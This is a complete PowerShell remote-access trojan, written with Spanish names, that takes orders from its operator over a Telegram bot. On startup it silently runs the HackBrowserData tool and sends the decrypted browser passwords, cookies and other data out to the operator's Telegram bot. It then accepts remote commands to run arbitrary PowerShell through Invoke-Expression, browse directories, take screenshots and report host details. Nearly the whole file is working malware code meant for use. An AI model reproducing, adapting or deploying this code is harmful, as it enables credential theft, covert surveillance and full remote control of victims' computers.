param(
    [Parameter(Mandatory=$true)]
    [string]$Token,
    
    [Parameter(Mandatory=$true)]
    [string]$ChatId
)

$ErrorActionPreference = "SilentlyContinue"
$ApiUrl = "https://api.telegram.org/bot$Token"
$LastUpdateId = 0
$Global:EstadoInternet = $false
$Global:PrimeraEjecucion = $true

$LogPath = "$env:APPDATA\CarpetaDos\debug.log"
$null = New-Item -ItemType Directory -Path (Split-Path $LogPath) -Force -ErrorAction SilentlyContinue
Start-Transcript -Path $LogPath -Force | Out-Null

Add-Type -AssemblyName System.Windows.Forms | Out-Null
Add-Type -AssemblyName System.Drawing | Out-Null

# ============================================
# FUNCIONES DE UTILIDAD
# ============================================

function Enviar-Mensaje {
    param ($chatId, $texto)
    try {
        $Body = @{ chat_id = $chatId; text = $texto; parse_mode = "Markdown" }
        $json = $Body | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri "$ApiUrl/sendMessage" -Method Post -ContentType "application/json" -Body $json | Out-Null
    } catch { 
        Add-Content $LogPath "Error enviando mensaje: $_" 
    }
}

function Enviar-MensajeLargo {
    param ($chatId, $texto)
    $max = 4000
    if ($texto.Length -le $max) {
        Enviar-Mensaje -chatId $chatId -texto $texto
        return
    }
    $partes = [math]::Ceiling($texto.Length / $max)
    for ($i = 0; $i -lt $partes; $i++) {
        $inicio = $i * $max
        $longitud = [math]::Min($max, $texto.Length - $inicio)
        $parte = $texto.Substring($inicio, $longitud)
        Enviar-Mensaje -chatId $chatId -texto "```$parte```"
        Start-Sleep -Milliseconds 500
    }
}

function Enviar-DocumentoRaw {
    param ($chatId, $rutaArchivo, $caption)
    try {
        if (-not (Test-Path $rutaArchivo)) { 
            Add-Content $LogPath "Archivo no existe: $rutaArchivo"
            return $false 
        }
        
        $file = Get-Item $rutaArchivo
        $uri = "$ApiUrl/sendDocument"
        
        $fileBytes = [System.IO.File]::ReadAllBytes($rutaArchivo)
        $enc = [System.Text.Encoding]::GetEncoding("ISO-8859-1")
        $fileContent = $enc.GetString($fileBytes)
        
        $boundary = [System.Guid]::NewGuid().ToString()
        $bodyLines = @(
            "--$boundary",
            'Content-Disposition: form-data; name="chat_id"',
            "",
            $chatId,
            "--$boundary",
            'Content-Disposition: form-data; name="document"; filename="' + $file.Name + '"',
            'Content-Type: application/octet-stream',
            "",
            $fileContent
        )
        
        if ($caption) {
            $bodyLines += @(
                "--$boundary",
                'Content-Disposition: form-data; name="caption"',
                "",
                $caption
            )
        }
        
        $bodyLines += "--$boundary--"
        $body = $bodyLines -join "`r`n"
        
        $response = Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
        Add-Content $LogPath "Enviado: $($file.Name) - OK: $($response.ok)"
        return $true
    } catch { 
        Add-Content $LogPath "Error enviando doc raw: $_" 
        return $false
    }
}

function Enviar-Foto {
    param ($chatId, $rutaFoto, $titulo)
    try {
        if (-not (Test-Path $rutaFoto)) { return }
        $uri = "$ApiUrl/sendPhoto"
        
        $bytes = [System.IO.File]::ReadAllBytes($rutaFoto)
        $enc = [System.Text.Encoding]::GetEncoding("ISO-8859-1")
        $content = $enc.GetString($bytes)
        
        $boundary = [System.Guid]::NewGuid().ToString()
        $body = @(
            "--$boundary",
            'Content-Disposition: form-data; name="chat_id"',
            "",
            $chatId,
            "--$boundary",
            'Content-Disposition: form-data; name="photo"; filename="capture.png"',
            'Content-Type: image/png',
            "",
            $content,
            "--$boundary",
            'Content-Disposition: form-data; name="caption"',
            "",
            $titulo,
            "--$boundary--"
        ) -join "`r`n"
        
        Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body | Out-Null
    } catch { 
        Add-Content $LogPath "Error enviando foto: $_" 
    }
}

function Tomar-Captura {
    param ($chatId)
    try {
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen
        $bitmap = New-Object System.Drawing.Bitmap($screen.Bounds.Width, $screen.Bounds.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Bounds.Location, [System.Drawing.Point]::Empty, $screen.Bounds.Size)
        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
        $ruta = "$env:TEMP\capture_$timestamp.png"
        $bitmap.Save($ruta, [System.Drawing.Imaging.ImageFormat]::Png)
        $graphics.Dispose()
        $bitmap.Dispose()
        Enviar-Foto -chatId $chatId -rutaFoto $ruta -titulo "Screenshot - $timestamp"
        Start-Sleep -Seconds 1
        Remove-Item $ruta -Force -ErrorAction SilentlyContinue
    } catch {
        Add-Content $LogPath "Error captura: $_"
        Enviar-Mensaje -chatId $chatId -texto "Error captura"
    }
}

function Ejecutar-HackBrowserData {
    param ($chatId, $silencioso = $false)
    
    if (-not $silencioso) { 
        Enviar-Mensaje -chatId $chatId -texto "Extrayendo datos de navegadores con HackBrowserData..." 
    }
    
    try {
        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
        $tempDir = "$env:TEMP\BrowserData_$timestamp"
        New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
        
        $scriptDir = Split-Path -Parent $MyInvocation.ScriptName
        if ([string]::IsNullOrEmpty($scriptDir)) {
            $scriptDir = (Get-Location).Path
        }
        
        $hackBrowserPath = Join-Path $scriptDir "hackbrowserdata.exe"
        
        if (-not (Test-Path $hackBrowserPath)) {
            $hackBrowserPath = ".\hackbrowserdata.exe"
        }
        
        if (-not (Test-Path $hackBrowserPath)) {
            if (-not $silencioso) {
                Enviar-Mensaje -chatId $chatId -texto "Error: No se encontro hackbrowserdata.exe"
            }
            Add-Content $LogPath "hackbrowserdata.exe no encontrado"
            return $false
        }
        
        Add-Content $LogPath "Ejecutando: $hackBrowserPath"
        
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = $hackBrowserPath
        $psi.Arguments = "-f json -dir `"$tempDir`""
        $psi.WorkingDirectory = $scriptDir
        $psi.CreateNoWindow = $true
        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $psi.UseShellExecute = $false
        $psi.RedirectStandardOutput = $true
        $psi.RedirectStandardError = $true
        
        $process = [System.Diagnostics.Process]::Start($psi)
        $process.WaitForExit()
        
        $stdout = $process.StandardOutput.ReadToEnd()
        $stderr = $process.StandardError.ReadToEnd()
        
        Add-Content $LogPath "HackBrowserData stdout: $stdout"
        Add-Content $LogPath "HackBrowserData stderr: $stderr"
        Add-Content $LogPath "Exit code: $($process.ExitCode)"
        
        $archivosJSON = Get-ChildItem -Path $tempDir -Filter "*.json" -Recurse -ErrorAction SilentlyContinue
        
        if ($archivosJSON.Count -eq 0) {
            if (-not $silencioso) {
                Enviar-Mensaje -chatId $chatId -texto "No se generaron archivos JSON. Verifica que los navegadores esten instalados."
            }
            Add-Content $LogPath "No se encontraron archivos JSON"
            Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
            return $false
        }
        
        Add-Content $LogPath "Archivos encontrados: $($archivosJSON.Count)"
        
        $enviados = 0
        $errores = @()
        
        foreach ($archivo in $archivosJSON) {
            $nombreOriginal = $archivo.Name
            $nombreConTimestamp = "$($archivo.BaseName)_$timestamp.json"
            $rutaRenombrado = Join-Path $archivo.DirectoryName $nombreConTimestamp
            
            Rename-Item -Path $archivo.FullName -NewName $nombreConTimestamp -Force
            
            $caption = "[$nombreOriginal] - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
            Add-Content $LogPath "Enviando: $nombreConTimestamp"
            
            $resultado = Enviar-DocumentoRaw -chatId $chatId -rutaArchivo $rutaRenombrado -caption $caption
            
            if ($resultado) {
                $enviados++
            } else {
                $errores += $nombreOriginal
            }
            
            Start-Sleep -Milliseconds 300
        }
        
        Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
        
        $mensaje = "Extraccion completada. Archivos enviados: $enviados"
        if ($errores.Count -gt 0) {
            $mensaje += " Errores: $($errores.Count)"
        }
        
        if (-not $silencioso) {
            Enviar-Mensaje -chatId $chatId -texto $mensaje
        }
        
        Add-Content $LogPath $mensaje
        return ($enviados -gt 0)
        
    } catch {
        Add-Content $LogPath "Error en Ejecutar-HackBrowserData: $_"
        if (-not $silencioso) {
            Enviar-Mensaje -chatId $chatId -texto "Error extrayendo datos: $_"
        }
        return $false
    }
}

function Probar-Conexion {
    try { 
        Invoke-RestMethod -Uri 'https://api.telegram.org' -Method Head -TimeoutSec 5 | Out-Null
        return $true 
    } catch { 
        return $false 
    }
}

function Obtener-Info {
    try { 
        $ip = (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5).ip
        return "PC: $($env:COMPUTERNAME) | User: $($env:USERNAME) | IP: $ip"
    } catch { 
        return "PC: $($env:COMPUTERNAME) | User: $($env:USERNAME)"
    }
}

function Obtener-DirectorioActual {
    return (Get-Location).Path
}

function Ejecutar-Comando {
    param ($comando, $chatId)
    try {
        Add-Content $LogPath "Ejecutando comando: $comando"
        $dirActual = Obtener-DirectorioActual
        
        $salida = Invoke-Expression $comando 2>&1 | Out-String
        
        $resultado = "Directorio: $dirActual`n$('='*50)`n$salida"
        
        if ([string]::IsNullOrWhiteSpace($salida)) {
            $resultado += "(Sin salida)"
        }
        
        if ($resultado.Length -gt 4000) {
            Enviar-MensajeLargo -chatId $chatId -texto $resultado
        } else {
            Enviar-Mensaje -chatId $chatId -texto "``````$resultado``````"
        }
    } catch {
        Add-Content $LogPath "Error en comando: $_"
        Enviar-Mensaje -chatId $chatId -texto "Error ejecutando comando: $_"
    }
}

function Listar-Directorio {
    param ($chatId)
    try {
        $dirActual = Obtener-DirectorioActual
        $items = Get-ChildItem | Select-Object Mode, LastWriteTime, Length, Name | Format-Table -AutoSize | Out-String
        
        $resultado = "Directorio: $dirActual`n$('='*50)`n$items"
        Enviar-Mensaje -chatId $chatId -texto "``````$resultado``````"
    } catch {
        Enviar-Mensaje -chatId $chatId -texto "Error listando directorio: $_"
    }
}

function Cambiar-Directorio {
    param ($ruta, $chatId)
    try {
        Set-Location $ruta -ErrorAction Stop
        $nuevoDir = Obtener-DirectorioActual
        Enviar-Mensaje -chatId $chatId -texto "Directorio cambiado a: $nuevoDir"
    } catch {
        Enviar-Mensaje -chatId $chatId -texto "Error: No se pudo cambiar a '$ruta'"
    }
}

# ============================================
# INICIO DEL BOT
# ============================================

Enviar-Mensaje -chatId $ChatId -texto "Bot iniciado en $(Obtener-Info)"

while ($true) {
    $net = Probar-Conexion
    
    if ($net -and -not $Global:EstadoInternet) {
        $Global:EstadoInternet = $true
        if ($Global:PrimeraEjecucion) {
            $Global:PrimeraEjecucion = $false
            Enviar-Mensaje -chatId $ChatId -texto "Conectado - $(Obtener-Info)`nExtrayendo datos de navegadores..."
            Start-Sleep -Seconds 2
            Ejecutar-HackBrowserData -chatId $ChatId -silencioso $true
        }
    } elseif (-not $net) {
        $Global:EstadoInternet = $false
        Start-Sleep -Seconds 10
        continue
    }
    
    try {
        $offset = $LastUpdateId + 1
        $url = "$ApiUrl/getUpdates?offset=$offset&limit=5"
        $res = Invoke-RestMethod -Uri $url -Method Get -TimeoutSec 20
        
        if ($res.ok -and $res.result.Count -gt 0) {
            foreach ($up in $res.result) {
                $LastUpdateId = $up.update_id
                $msg = $up.message
                if ($msg -and $msg.from.id -eq $ChatId -and $msg.text) {
                    $txt = $msg.text.Trim()
                    $cid = $msg.chat.id
                    $txtLower = $txt.ToLower()
                    
                    Add-Content $LogPath "Comando recibido: $txt"
                    
                    if ($txtLower -eq 'ls' -or $txtLower -eq '/ls') {
                        Listar-Directorio -chatId $cid
                    } 
                    elseif ($txtLower -match '^cmd\s+(.+)') {
                        $c = $matches[1]
                        Ejecutar-Comando -comando $c -chatId $cid
                    }
                    elseif ($txtLower -match '^/cmd\s+(.+)') {
                        $c = $matches[1]
                        Ejecutar-Comando -comando $c -chatId $cid
                    } 
                    elseif ($txtLower -match '^cd\s+(.+)') {
                        $ruta = $matches[1]
                        Cambiar-Directorio -ruta $ruta -chatId $cid
                    }
                    elseif ($txtLower -match '^/cd\s+(.+)') {
                        $ruta = $matches[1]
                        Cambiar-Directorio -ruta $ruta -chatId $cid
                    } 
                    elseif ($txtLower -eq '/pwd' -or $txtLower -eq 'pwd') {
                        $dir = Obtener-DirectorioActual
                        Enviar-Mensaje -chatId $cid -texto "Directorio actual: $dir"
                    } 
                    elseif ($txtLower -eq 'steal' -or $txtLower -eq '/steal') {
                        Ejecutar-HackBrowserData -chatId $cid
                    } 
                    elseif ($txtLower -eq 'captura' -or $txtLower -eq '/captura') {
                        Tomar-Captura -chatId $cid
                    } 
                    elseif ($txtLower -eq 'info' -or $txtLower -eq '/info') {
                        $info = Obtener-Info
                        $dir = Obtener-DirectorioActual
                        Enviar-Mensaje -chatId $cid -texto "$info`nDirectorio: $dir"
                    } 
                    elseif ($txtLower -eq 'help' -or $txtLower -eq '/help') {
                        $ayuda = @'
Comandos disponibles:
/ls - Listar archivos en directorio actual
/cmd comando - Ejecutar comando PowerShell
/cd ruta - Cambiar de directorio
/pwd - Mostrar directorio actual
/steal - Extraer datos de navegadores (JSON desencriptado)
/captura - Tomar screenshot
/info - Informacion del sistema
/help - Mostrar esta ayuda
'@
                        Enviar-Mensaje -chatId $cid -texto $ayuda
                    }
                }
            }
        }
    } catch { 
        Add-Content $LogPath "Error loop: $_" 
    }
    Start-Sleep -Seconds 1
}
